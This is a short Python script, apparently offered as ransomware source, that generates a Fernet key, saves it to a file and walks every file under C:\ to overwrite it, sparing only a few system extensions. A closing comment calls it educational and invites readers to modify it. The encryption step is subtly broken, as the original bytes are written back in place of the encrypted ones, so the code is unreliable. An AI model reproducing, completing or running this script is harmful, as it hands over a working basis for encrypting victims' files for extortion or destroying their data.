import os
from cryptography.fernet import Fernet
# generate key  
key = Fernet.generate_key()
with open('Key.key', 'wb')as W:
    W.write(key)
# Walk through all file in C directory
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        d = os.path.join(root, file)
        # Check for these file if files found continue and leave them
        if d.endswith('.ini') or d.endswith('.DAT') or d.endswith('.log.tmp') or d.endswith('.sys') or d.endswith('.LOG1') or d.endswith('.LOG2'):
            continue
        else:
            # start encryption of all file in directory
            with open(d, 'rb')as r:
                h = r.read()
            f = Fernet(key).encrypt(h)
            with open(d, 'wb')as w:
                w.write(h)

# USE ON YOUR RISK AND YOU CAN MODIFY BY YOURSELF AS PER YOUR NEED I'M JUST NOT MAKING IT MORE ADVANCE 
# IT'S JUST FOR EDUCATIONAL PURPOSE
